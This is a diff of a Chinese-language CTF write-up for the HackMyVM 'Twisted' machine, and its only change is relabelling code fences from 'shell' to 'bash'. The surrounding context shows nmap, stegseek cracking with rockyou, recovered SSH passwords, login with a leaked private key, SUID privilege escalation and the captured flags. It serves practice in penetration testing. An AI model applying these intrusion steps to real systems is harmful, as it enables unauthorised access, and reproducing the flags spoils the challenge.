@@ -29,7 +29,7 @@ An easy one. Tested on Vbox.
 
 ## nmap 信息搜集
 
-```shell
+```bash
 Nmap scan report for 192.168.56.104
 Host is up (0.00034s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -53,7 +53,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## web 服务
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $http get 192.168.56.104
 HTTP/1.1 200 OK
@@ -77,7 +77,7 @@ Transfer-Encoding: chunked
 
 将两个 jpg 文件下载下来进行分析
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $wget http://192.168.56.104/cat-original.jpg
 --2023-12-22 21:53:06--  http://192.168.56.104/cat-original.jpg
@@ -105,7 +105,7 @@ cat-hidden.jpg                    100%[=========================================
 
 ## stegseek 隐写
 
-```shell title="cat-original.jpg stegseek"
+```bash title="cat-original.jpg stegseek"
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
@@ -115,7 +115,7 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Extracting to "cat-original.jpg.out".
 ```
 
-```shell title="cat-hidden.jpg stegseek"
+```bash title="cat-hidden.jpg stegseek"
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
@@ -143,7 +143,7 @@ thisismypassword
 mateo:thisismypassword
 ```
 
-```shell title="SSH mateo"
+```bash title="SSH mateo"
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $ssh mateo@192.168.56.104 -p 2222
 mateo@192.168.56.104's password:
@@ -164,7 +164,7 @@ mateo
 markus:markuslovesbonita
 ```
 
-```shell title="SSH mateo"
+```bash title="SSH mateo"
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $ssh markus@192.168.56.104 -p 2222
 markus@192.168.56.104's password:
@@ -270,7 +270,7 @@ D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
 
 ## SSH 私钥利用
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Twisted]
 └──╼ $ssh bonita@192.168.56.104 -p 2222 -i id_rsa
 Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
@@ -287,7 +287,7 @@ bonita
 
 ## user pwn
 
-```shell
+```bash
 bonita@twisted:~$ cat user.txt
 HMVblackcat
 ```
@@ -296,7 +296,7 @@ HMVblackcat
 
 发现用户目录存在一个 suid 二进制文件
 
-```shell
+```bash
 bonita@twisted:~$ ls -lh
 total 24K
 -rwsrws--- 1 root   bonita 17K Oct 14  2020 beroot
@@ -309,7 +309,7 @@ total 24K
 
 从伪代码中可以看到判断逻辑，并且结合程序具有 suid 属性，存在提权可能性
 
-```shell
+```bash
 bonita@twisted:~$ ./beroot
 Enter the code:
  5880
@@ -319,7 +319,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 root@twisted:/root# cat root.txt
 HMVwhereismycat
 ```
@@ -328,7 +328,7 @@ HMVwhereismycat
 
 既然 `tail` 能够做到任意文件读取的话，其实可以直接读取 `root.txt` 的文件内容
 
-```shell
+```bash
 bonita@twisted:~$ tail /root/root.txt
 HMVwhereismycat
 ```
